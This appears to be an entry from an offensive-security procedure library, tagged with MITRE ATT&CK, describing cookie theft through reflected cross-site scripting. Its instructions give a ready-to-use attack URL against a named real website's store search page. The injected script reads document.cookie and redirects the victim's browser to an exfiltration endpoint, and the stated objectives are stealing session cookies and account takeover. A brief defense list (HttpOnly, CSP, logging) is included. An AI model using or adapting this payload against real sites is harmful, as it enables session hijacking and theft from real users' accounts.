---
id: proc-xss-cookie-exfil
tags:
  - cookie-theft
  - exfiltration
  - xss
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Credential Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials In Files]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.195Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Credentials In Files]]'
  - '[[JavaScript]]'
---
# Exfiltrate-Cookies-Using-XSS-Payload

## Summary

This procedure uses a reflected XSS payload to access and exfiltrate session cookies from the victim's browser to an attacker-controlled server, exploiting missing HttpOnly flags.

## Description

Building on the XSS trigger, craft a payload that reads document.cookie and redirects to a local server with the data in the URL query. This demonstrates session hijacking potential, as cookies without HttpOnly are JavaScript-accessible. The attack requires the victim to visit the URL; the target is the same store search page. Note: Program policy deems non-sensitive cookies out-of-scope, but the technique applies broadly.

## Requirements

1. Confirmed XSS vulnerability
2. Running local exfiltration server from prior setup
3. Browser for payload delivery

## Defense

Defensive measures and detection strategies:

- Enforce HttpOnly and Secure flags on all cookies
- Implement client-side CSP to block inline scripts
- Log and alert on suspicious redirects or data exfiltration in browser/network traffic

## Objectives

1. Steal authentication cookies via JavaScript
2. Transmit data to attacker server
3. Enable replay for account takeover

## Instructions

### Step 1: Craft Exfiltration Payload URL

**Context**: Encode a script that captures cookies and redirects to the local PHP endpoint.

**Command** (Direct URL Navigation):

```url
https://www.starbucks.co.jp/store/search/?free_word=%22%3E%3Cscript%3Evar cookie =document.cookie;location.href=`http://localhost/test.php?cookie=${cookie}`%3C/script%3E
```

> This injects <script>var cookie =document.cookie;location.href=`http://localhost/test.php?cookie=${cookie}`</script>. Expected output: Browser redirects to localhost with cookies in query.

### Step 2: Verify Capture on Server

**Context**: Check the local server file for received data.

**Instructions**: After visiting the URL, inspect cookiefile.txt on the server.

> Expected output: File contains cookie string, e.g., "sessionid=abc123; user=guest".

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]
- [[Collection]]

### Techniques

- [[Credentials In Files]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- [[cookie-theft]]
- [[xss]]
